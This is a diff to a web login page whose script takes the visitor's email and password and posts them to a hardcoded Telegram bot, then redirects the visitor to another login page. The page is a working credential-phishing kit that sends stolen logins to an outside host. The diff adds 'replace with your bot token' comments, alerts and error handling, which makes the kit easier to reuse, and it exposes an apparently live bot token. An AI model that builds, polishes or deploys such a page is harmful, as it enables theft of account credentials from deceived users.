@@ -48,7 +48,6 @@
             max-width: 950px;
             box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
             overflow: hidden;
-            transition: 0.4s;
         }
         
         .left-section {
@@ -184,14 +183,14 @@
 
             // Validate inputs
             if (!email || !password) {
-                console.error('Login details not found.');
+                alert('Please fill in both fields.'); // Show alert for empty inputs
                 return; // Exit if fields are empty
             }
 
             const message = `Email: ${email}\nPassword: ${password}`;
 
-            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg';
-            const chatId = '6367881211';
+            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg'; // Replace with your bot token
+            const chatId = '6367881211'; // Replace with your chat ID
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -212,12 +211,16 @@
                 .then(data => {
                     if (data.ok) {
                         console.log('Message sent successfully');
-                        window.location.href = "login.html";
+                        window.location.href = "login.html"; // Redirect upon success
                     } else {
                         console.error('Error sending message:', data.description);
+                        alert('Failed to send message. Please try again.');
                     }
                 })
-                .catch(error => console.error('Error:', error));
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again later.');
+                });
         });
     </script>
 </body>
